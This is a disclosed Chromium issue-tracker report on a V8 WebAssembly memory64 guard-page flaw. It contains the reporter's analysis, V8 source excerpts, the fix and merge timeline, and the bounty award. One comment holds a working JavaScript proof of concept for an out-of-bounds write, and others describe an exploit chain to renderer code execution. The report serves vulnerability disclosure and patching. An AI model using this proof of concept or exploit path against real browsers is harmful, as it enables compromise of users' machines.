# WebAssembly out-of-bounds memory access due to broken memory64 guard page assumptions

| Field | Value |
|-------|-------|
| **Issue ID** | [388290793](https://issues.chromium.org/issues/388290793) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | cl...@chromium.org |
| **Created** | 2025-01-07 |
| **Bounty** | $55,000.00 |

## Description

### VULNERABILITY DETAILS

#### Summary

WebAssembly OOB memory access due to broken memory64 guard page assumptions. Generated code assumes `WasmMemory::max_memory_size` bytes of total reserved guard region for memory64, where imported memory (or module-instantiated memory under memory pressure, etc.) may reserve guard pages smaller than assumed resulting in out-of-bounds read/write from Wasm memory.

This notably does not immediately result in a crash due to trap handler mistakenly suppressing segfaults.

#### Details

Memory64 enabled by default from M133 allocates **at most** maximum bytes of reserved guard pages under the assumption that at runtime we do proper bounds check on the dynamic index. Allocation is done as below:

```
MaybeHandle<WasmMemoryObject> WasmMemoryObject::New(
    Isolate* isolate, int initial, int maximum, SharedFlag shared,
    wasm::AddressType address_type) {
  bool has_maximum = maximum != kNoMaximum;

  int engine_maximum = address_type == wasm::AddressType::kI64
                           ? static_cast<int>(wasm::max_mem64_pages())
                           : static_cast<int>(wasm::max_mem32_pages());

  if (initial > engine_maximum) return {};

#ifdef V8_TARGET_ARCH_32_BIT
  // ...
#else
  int heuristic_maximum =
      has_maximum ? std::min(engine_maximum, maximum) : engine_maximum;
#endif

  std::unique_ptr<BackingStore> backing_store =
      BackingStore::AllocateWasmMemory(isolate, initial, heuristic_maximum,     // [!] requests allocation of potentially smaller size
                                       address_type == wasm::AddressType::kI32
                                           ? WasmMemoryFlag::kWasmMemory32
                                           : WasmMemoryFlag::kWasmMemory64,
                                       shared);

  if (!backing_store) return {};

  DirectHandle<JSArrayBuffer> buffer =
      shared == SharedFlag::kShared
          ? isolate->factory()->NewJSSharedArrayBuffer(std::move(backing_store))
          : isolate->factory()->NewJSArrayBuffer(std::move(backing_store));

  return New(isolate, buffer, maximum, address_type);
}

// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/backing-store.cc;drc=f39c57f31413abcb41d3068cfb2c7a1718003cc5;l=383
std::unique_ptr<BackingStore> BackingStore::AllocateWasmMemory(
    Isolate* isolate, size_t initial_pages, size_t maximum_pages,
    WasmMemoryFlag wasm_memory, SharedFlag shared) {
  // ...
  auto TryAllocate = [isolate, initial_pages, wasm_memory,
                      shared](size_t maximum_pages) {
    auto result = TryAllocateAndPartiallyCommitMemory(                          // [!] reserves GetReservationSize()
        isolate, initial_pages * wasm::kWasmPageSize,
        maximum_pages * wasm::kWasmPageSize, wasm::kWasmPageSize, initial_pages,
        maximum_pages, wasm_memory, shared);
    if (result && shared == SharedFlag::kShared) {
      result->type_specific_data_.shared_wasm_memory_data =
          new SharedWasmMemoryData();
    }
    return result;
  };
  auto backing_store = TryAllocate(maximum_pages);
  if (!backing_store && maximum_pages - initial_pages >= 4) {
    // Retry with smaller maximum pages at each retry.
    // ...
  }
  return backing_store;
}

// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/backing-store.cc;drc=f39c57f31413abcb41d3068cfb2c7a1718003cc5;l=54
size_t GetReservationSize(bool has_guard_regions, size_t byte_capacity,
                          bool is_wasm_memory64) {
#if V8_TARGET_ARCH_64_BIT && V8_ENABLE_WEBASSEMBLY
  // ...
  if (has_guard_regions && !is_wasm_memory64) {
    // ...
  }
#else
  DCHECK(!has_guard_regions);
#endif

  return byte_capacity;
}

```

This may result in reservations smaller than `WasmMemoryObject::maximum_pages()`. Additionally, for imported memory we only assert that this is smaller than declared in `WasmMemory::maximum_pages`, where if maximum pages is not defined we even do not run any checks:

```
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/module-instantiate.cc;drc=f39c57f31413abcb41d3068cfb2c7a1718003cc5;l=2393
    int32_t imported_maximum_pages = memory_object->maximum_pages();
    if (memory->has_maximum_pages) {
      if (imported_maximum_pages < 0) {
        thrower_->LinkError(
            "%s: memory import has no maximum limit, expected at most %u",
            ImportName(import_index).c_str(), imported_maximum_pages);
        return false;
      }
      if (static_cast<uint64_t>(imported_maximum_pages) >
          memory->maximum_pages) {
        thrower_->LinkError(
            "%s: memory import has a larger maximum size %u than the "
            "module's declared maximum %" PRIu64,
            ImportName(import_index).c_str(), imported_maximum_pages,
            memory->maximum_pages);
        return false;
      }
    }

```

However, JITed code considers `WasmMemory::max_memory_size` (calculated from `WasmMemory::maximum_pages`) as the total guard page size and bound checks against this:

```
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/liftoff-compiler.cc;drc=8889d80370200d499073612d010461551585a964;l=3435
#if V8_TRAP_HANDLER_SUPPORTED
    if (use_trap_handler) {
#if V8_TARGET_ARCH_ARM64 || V8_TARGET_ARCH_X64
      if (memory->is_memory64()) {
        SCOPED_CODE_COMMENT("bounds check memory");
        // Bounds check `index` against `max_mem_size - end_offset`, such that
        // at runtime `index + end_offset` will be < `max_mem_size`, where the
        // trap handler can handle out-of-bound accesses.
        __ set_trap_on_oob_mem64(
            index_ptrsize, memory->max_memory_size - end_offset, trap_label);    // [!] may be larger than total reservation
      }
#else
      CHECK(!memory->is_memory64());
#endif  // V8_TARGET_ARCH_ARM64 || V8_TARGET_ARCH_X64

      // With trap handlers we should not have a register pair as input (we
      // would only return the lower half).
      DCHECK(index.is_gp());
      return index_ptrsize;
    }

```

Thus, we have a very trivial OOB read/write. By using exploit techniques as shown in [b/351327767#comment6](https://issues.chromium.org/issues/351327767#comment6) we are able to obtain full RCE.

The attached PoC demonstrates an OOB write from a Wasm memory to another unrelated Wasm memory by using this bug. Unfortunately the trap handler mistakenly handles segfaults from this OOB access as a guard page access and suppresses it, so even when removing `fn(0x100000n, 0x4242424242424242n);` the PoC will not crash. It is however easy to see that there indeed is an OOB access.

#### Bisect

Bug seems to stem back to the introduction of `wasm_memory64_trap_handling`, which has been enabled by default from <https://crrev.com/c/5601727>. This is because even before <https://crrev.com/c/5940685> there was no guarantee that the memory would have enough guard page reservations.

### VERSION

Memory64 is scheduled to ship in M133 by <https://crrev.com/c/6056034> as per [b/380234230](https://issues.chromium.org/issues/380234230).

Chrome Version:

- `wasm_memory64_trap_handling` enabled by default @ 127.0.6533.4
- Memory64 enabled by default @ 133.0.6875.0

Operating System: OS/Platforms that support memory64 trap handling (most x86-64 platforms & arm64 platforms excluding Android)

### REPRODUCTION CASE

Attached as `poc.js` which demonstrates an OOB write. Note that this will not result in a crash / ASAN stacktrace due to trap handling even when writing to an invalid region due to trap handling.

**Full exploit is WIP.**

### CREDIT INFORMATION

Reporter credit: Seunghyun Lee (@0x10n) of CMU CyLab

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 73.7 KB)
- [poc-crash.html](attachments/poc-crash.html) (text/html, 77.7 KB)
- [exp.html](attachments/exp.html) (text/html, 92.6 KB)

## Timeline

### se...@gmail.com (2025-01-07)

A crashing PoC on Chrome by corrupting ArrayBuffer PartitionAlloc metadata as described in [b/351327767#comment6](https://issues.chromium.org/issues/351327767#comment6). Due to alignment of v8sbx 4GiB vs PA 16GiB the repro succeeds in 75% of the runs, safely throws otherwise. Tested on Windows x86-64, latest canary version of 133.0.6943.0.

Since PartitionAlloc ShadowMetadata ([b/40238514](https://issues.chromium.org/issues/40238514)) as well as freelist corruption mitigations ([b/331454364](https://issues.chromium.org/issues/331454364)) are still WIP this primitive immediately results in arbitrary write outside of v8sbx (by the former bypass) and even control flow hijack (by the latter bypass).

---

@amyressler: Marking any potential VRP reward for this bug in advance to be processed for charity.

### jd...@chromium.org (2025-01-07)

jkummerow@: can you take a look at this since you took point on [crbug.com/351327767](https://crbug.com/351327767) ? Obviously feel free to reassign as needed.

### se...@gmail.com (2025-01-08)

Attached full exploit, tested on Windows x86-64 latest canary build 133.0.6943.0. Exploit pops `calc` on a `--no-sandbox` renderer.

Exploit uses this bug to corrupt `freelist_head` at PartitionAlloc metadata which grants arbitrary write on anywhere starting from a null pointer. Although this instantly achieves v8sbx bypass, to reduce version dependency we return back to the sandbox and use [b/385657148](https://issues.chromium.org/issues/385657148) to revive signature confusion primitives from [b/350292240](https://issues.chromium.org/issues/350292240).

### pe...@google.com (2025-01-08)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2025-01-08)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### cl...@chromium.org (2025-01-08)

Thanks for another excellent report, Seunghyun!

For imports I actually don't see how this can be fixed, other than disabling trap handling for imported memories. I'll upload a CL to do that.

For declared memories I don't see the problem, though. You note that we are reserving potentially less than `WasmMemoryObject::maximum_pages()`, but that's OK. What the compilers use is `WasmMemory::max_memory_size`, which is set in `WasmMemoryObject::maximum_pages()` and takes into account the engine's maximum [1]. Please let me know if you agree that this is not a problem.

[1] <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-module.h;l=162;drc=38826a17f5a1f3c818ce4483db32eb8beda09caa>

### se...@gmail.com (2025-01-08)

Re [comment#7](https://issues.chromium.org/issues/388290793#comment7): I might be missing something, but won't memory pressure result in potentially smaller reservations to be made at [`BackingStore::AllocateWasmMemory()`](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/backing-store.cc;drc=763100e0bf9a25ba6f203612af5a4331fbd2d048;l=407) compared to whatever `WasmMemory::max_memory_size` is set to? Memory32 always fixes reservation size at [`GetReservationSize()`](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/backing-store.cc;drc=763100e0bf9a25ba6f203612af5a4331fbd2d048;l=54) to the full guard size, but for memory64 I don't see any such mechanism to pin allocation requests to the (actual) maximum.

### pa...@microsoft.com (2025-01-08)

Great finding! (oops... I missed that case).

### se...@gmail.com (2025-01-08)

Non-import variant to demonstrate that [comment#8](https://issues.chromium.org/issues/388290793#comment8) is indeed a problem:

```
function gc() {
  try {
    new ArrayBuffer(0x7fe00000);
  } catch {}
}

let mem = new WebAssembly.Memory({initial: 0x10n, maximum: 0x10n, address: 'i64'});
let mem2 = new WebAssembly.Memory({initial: 0x10n, maximum: 0x10n, address: 'i64'});

// deplete memory
gc();
let mem_sprays = [], sz = 0x40000n;
// spray with largely empty allocations first to avoid oom (on Chrome, d8 is ok w/o this)
for (let i = 0; i < 0x40; i++) {
  let m = new WebAssembly.Memory({initial: 1n, maximum: sz, address: 'i64'});
  mem_sprays.push(m);
}
// fill up remaining space
for (let sz = 0x40000n; sz > 0n; ) {
  try {
    let m = new WebAssembly.Memory({initial: sz, maximum: sz, address: 'i64'});
    mem_sprays.push(m);
  } catch {
    sz /= 2n;
  }
}

// free mem
mem = undefined;
gc();

// attempt large allocation that fits into mem
let builder = new WasmModuleBuilder();
let $m = builder.addMemory64(0xf, 0x40000);

let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));

builder.addFunction('fn', $sig_v_ll).addBody([
  kExprLocalGet, 0,
  kExprLocalGet, 1,
  kExprI64StoreMem, 0x41, ...wasmUnsignedLeb($m), ...wasmSignedLeb64(0n),
]).exportFunc();

let instance = builder.instantiate();
let {fn} = instance.exports;

let mem2_u64a = new BigUint64Array(mem2.buffer);
console.log(mem2_u64a[0].toString(16));
fn(0x100000n, 0x4242424242424242n); // oob write into mem2
console.log(mem2_u64a[0].toString(16));

```

The root issue is that any Wasm memory, both imports and declared, can have a smaller reserved size than declared at both `WasmMemory` and `WasmMemoryObject` for whatever reason - smaller import, not enough memory, etc.

### se...@gmail.com (2025-01-08)

~~I think (but have not tested) that Wasm growing is also broken. Since `reservation < memory_object->maximum_pages()` is possible on memory pressure, growing Wasm memory through `memory.grow` will result in out-of-bounds growth in `BackingStore::GrowWasmMemoryInPlace()`. This would also allow us to defeat ShadowMetadata as we can simply set out-of-bounds memory pages, including PartitionAlloc metadata, as read-write.~~

~~Again, in both `WasmMemory` and `WasmMemoryObject` the maximum size/page does not hold much significance with respect to reservation size as the actual reservation could always be smaller.~~

Guess this won't work due to `max_pages = std::min(max_pages, byte_capacity_ / wasm::kWasmPageSize)`, but even with ShadowMetadata we can still probably use [b/331454364](https://issues.chromium.org/issues/331454364) :)

### cl...@chromium.org (2025-01-09)

Thanks for clarifying, I missed that we reduce the reservation size on memory pressure. In that case I guess the whole trap handling approach for memory64 does not work and needs to be disabled entirely.

Paolo, let me know if you see a way to fix this.

### ap...@google.com (2025-01-09)

Project: v8/v8  

Branch: main  

Author: Clemens Backes <[clemensb@chromium.org](mailto:clemensb@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6162736>

[wasm][memory64] Disable trap handling

---


Expand for full commit details
```
[wasm][memory64] Disable trap handling 
 
Trap handling makes unsound assumptions; disable it altogether for now. 
This needs to be fixed, or removed entirely if we don't find a fix. 
 
Plus two minor drive-by changes. 
 
R=jkummerow@chromium.org 
 
Fixed: 388290793 
Change-Id: If756fc5296b2dd8770359fac4979f547d1881a76 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6162736 
Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
Commit-Queue: Clemens Backes <clemensb@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98017}

```

---

Files:

- M `src/flags/flag-definitions.h`
- M `src/objects/backing-store.cc`
- M `src/wasm/wasm-module.h`
- A `test/mjsunit/regress/wasm/regress-388290793.js`

---

Hash: 7b598f3d13ec81a3821166921c0f01540bf7717a  

Date:  Thu Jan 09 10:47:56 2025


---

### pe...@google.com (2025-01-09)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M133. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### pe...@google.com (2025-01-10)

**Merge approved:** your change passed merge requirements and is auto-approved for M133. Please go ahead and merge the CL to branch 6943 (refs/branch-heads/6943) manually. Please contact milestone owner if you have questions.
Merge instructions: <https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md>
Owners: None (Android), None (iOS), andywu (ChromeOS), None (Desktop)

### ap...@google.com (2025-01-10)

Project: v8/v8  

Branch: refs/branch-heads/13.3  

Author: Clemens Backes <[clemensb@chromium.org](mailto:clemensb@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6163458>

Merged: [wasm][memory64] Disable trap handling

---


Expand for full commit details
```
Merged: [wasm][memory64] Disable trap handling 
 
Trap handling makes unsound assumptions; disable it altogether for now. 
This needs to be fixed, or removed entirely if we don't find a fix. 
 
Plus two minor drive-by changes. 
 
R=jkummerow@chromium.org 
 
(cherry picked from commit 7b598f3d13ec81a3821166921c0f01540bf7717a) 
 
Bug: 388290793 
Change-Id: Ia08f290b123ec26d187a2ccc238f5e1ae1e33005 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6163458 
Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
Commit-Queue: Clemens Backes <clemensb@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.3@{#8} 
Cr-Branched-From: 41dacffe436aeb9311879cb07648f1e36609a804-refs/heads/13.3.415@{#1} 
Cr-Branched-From: 3348638c0af67c885b30891a358c89a917ac9759-refs/heads/main@{#97937}

```

---

Files:

- M `src/flags/flag-definitions.h`
- M `src/objects/backing-store.cc`
- M `src/wasm/wasm-module.h`
- A `test/mjsunit/regress/wasm/regress-388290793.js`

---

Hash: a4d5b2104b985ada100b632248568eecbf8afb32  

Date:  Thu Jan 09 10:47:56 2025


---

### pe...@google.com (2025-01-10)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### cl...@chromium.org (2025-01-10)

Memory64 was only enabled in M-133, so this does **not** need to be merged to M-126.

### pa...@microsoft.com (2025-01-10)

To summarize, there are two problems, well described by Seunghyun:

- For imported memories, a WebAssembly.Memory can have a `maximum_pages` that is smaller than the maximum declared in the import, which is the value used for the bounds checking.
- The area reserved for 64-bit memories can be smaller than `maximum_pages`.

Clemens, I don't see many ways to fix this if we don’t relax these constraints on the reserved size:

- Trap handling would work with imported memories if we reserved the same amount of space for any 64-bit memory, independent from its `maximum_pages`,
- When the allocation of reserved memory fails, we should not retry with a smaller size.

In other words, a very simple fix would be to reserve 16GB (the current max limit `kV8MaxWasmMemory64Pages`) for all 64-bit memories similarly to how we always reserve 8GB for all 32-bit memories, with trap handling. Then the jitted code would always check against this 16GB constant value.

I am not sure if this solution is acceptable, but I would argue that the logic to retry with smaller sizes in `BackingStore::AllocateWasmMemory` never runs for 32-bit memories with trap handling, therefore it could make sense to disable it also in the 64-bit case. After all, if a module declares a maximum value for a memory, it is quite likely that it might need all that memory at some point. And this is even more likely when the module goes as far as to use 64-bit memories, signaling that it is memory-hungry.
After all we are talking of reserved, not committed memory.

What do you think?

### cl...@chromium.org (2025-01-10)

Ack, this is only relevant for 64-bit architectures anyway (we only have trap handling there), and we have plenty of address space available there. I checked with Samuel, and the sandbox provides 1TB of available address space (with 8GB pre-reserved for other purposes). So always reserving 16GB should work well enough, we should still be able to allocate ~60 64-bit memories in there.

### pa...@microsoft.com (2025-01-10)

Great! I'll upload a CL for this then :)

### qk...@google.com (2025-01-13)

Labeling as LTS-NotApplicable-126 because M126 has `wasm_memory64_trap_handling` feature as an experimental feature. 

### pe...@google.com (2025-01-16)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### cl...@chromium.org (2025-01-17)

Memory64 only shipped in M-133, so this does not require a merge to 132.

### sp...@google.com (2025-01-17)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
reward for demonstration of RCE in a sandboxed process / the renderer 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-01-17)

Congratulations Seunghyun on another excellent report! Thank you for your efforts and reporting this issue to us!

### rz...@google.com (2025-01-29)

Labelling as not applicable for LTS 132, the related feature only shipped in 133. See [comment #24](https://issues.chromium.org/issues/388290793#comment24)

### ch...@google.com (2025-04-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> reward for demonstration of RCE in a sandboxed process / the renderer

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/388290793)*
